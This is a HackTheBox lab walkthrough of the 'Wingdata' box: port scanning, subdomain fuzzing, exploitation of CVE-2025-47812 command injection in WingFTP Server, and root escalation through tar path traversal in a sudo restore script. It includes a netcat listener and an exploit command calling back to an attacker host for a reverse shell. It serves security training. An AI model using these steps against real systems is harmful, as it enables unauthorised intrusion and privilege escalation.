# Wingdata — HackTheBox Walkthrough

**Platform:** HackTheBox | **OS:** Linux

## Attack Chain

VHost enumeration finds a WingFTP server. CVE-2025-47812 command injection gives initial access. Root via a sudo Python restore script that extracts a crafted tar archive — tar path traversal writes an arbitrary file as root.

## Enumeration

```
nmap -sC -sV wingdata.htb -Pn

22/tcp open  ssh   OpenSSH
80/tcp open  http  wingdata.htb main site
```

Added wingdata.htb to /etc/hosts. Port 80 referenced a domain indicating virtual hosting.

## VHost Discovery

```
ffuf -u http://wingdata.htb -H 'Host: FUZZ.wingdata.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
```

Found: `ftp.wingdata.htb` — WingFTP Server web interface.

## CVE-2025-47812 — WingFTP Command Injection

CVE-2025-47812 is a command injection vulnerability in WingFTP Server's web interface. An unsanitised parameter delivers a reverse shell.

```
nc -lvnp 4444
python3 exploit_CVE-2025-47812.py --target http://ftp.wingdata.htb --lhost <ATTACKER_IP> --lport 4444
```

Shell obtained. User flag retrieved.

## PrivEsc — Tar Path Traversal

```
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/restore.py
```

`/opt/restore.py` accepts a tar archive and extracts it as root. tar does not sanitise paths — a crafted archive with `../` in the filename writes files outside the extraction directory.

```
python3 craft_tar.py
sudo /usr/bin/python3 /opt/restore.py -b backup_888.tar
```

Root shell obtained. Root flag at `/root/root.txt`.

---

*For educational purposes only. Only test systems you own or have explicit permission to test.*
